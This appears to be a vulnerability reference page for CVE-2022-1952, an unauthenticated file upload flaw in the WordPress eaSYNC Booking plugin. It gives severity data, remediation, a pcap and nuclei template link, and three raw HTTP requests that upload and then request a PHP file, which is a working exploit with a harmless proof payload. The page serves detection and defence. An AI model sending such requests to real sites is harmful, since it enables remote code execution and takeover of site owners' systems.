---
layout: post
cve_id: CVE-2022-1952
title: WordPress eaSYNC Booking <1.1.16 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1952.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1952.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: 'Successful exploitation of this vulnerability could result in remote code
  execution, allowing an attacker to take complete control of the affected WordPress
  site.

  '
remediation: 'Update to the latest version of the WordPress eaSYNC Booking plugin
  (1.1.16) or apply the vendor-provided patch to mitigate this vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/ecf61d17-8b07-4cb6-93a8-64c2c4fbbe04
- https://wordpress.org/plugins/easync-booking/
- https://nvd.nist.gov/vuln/detail/CVE-2022-1952
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/cyllective/CVEs
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-1952
  cwe-id: CWE-434
  epss-score: 0.85897
  epss-percentile: 0.99355
  cpe: cpe:2.3:a:syntactics:free_booking_plugin_for_hotels\,_restaurant_and_car_rental:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: syntactics
  product: free_booking_plugin_for_hotels\,_restaurant_and_car_rental
  framework: wordpress
tags:
- cve
- cve2022
- wpscan
- wordpress
- easync-booking
- unauth
- wp
- file-upload
- wp-plugin
- intrusive
- syntactics
- vkev
- vuln
---

## ðŸ” Vulnerability Description
WordPress eaSync Booking plugin bundle for hotel, restaurant and car rental before 1.1.16 is susceptible to arbitrary file upload. The plugin contains insufficient input validation of an AJAX action. An allowlist of valid file extensions is defined but is not used during the validation steps. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Connection: close
Content-Length: 615
Content-Type: multipart/form-data; boundary=------------------------98efee55508c5059
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37
Accept-Encoding: gzip
--------------------------98efee55508c5059
Content-Disposition: form-data; name="action"
easync_session_store
--------------------------98efee55508c5059
Content-Disposition: form-data; name="type"
car
--------------------------98efee55508c5059
Content-Disposition: form-data; name="with_driver"
self-driven
--------------------------98efee55508c5059
Content-Disposition: form-data; name="driver_license_image2"; filename="38F609tUVkOTpSfY7nf5MBq6e5d.php"
Content-Type: application/octet-stream
<?php echo md5("CVE-2022-1952");unlink(__FILE__);?>
--------------------------98efee55508c5059--
```

```nohighlight
GET /wp-admin/admin-ajax.php?action=easync_success_and_save HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
Connection: close
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37
Accept-Encoding: gzip
```

```nohighlight
GET /wp-content/uploads/RIuxPK.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Connection: close
Accept-Encoding: gzip
```

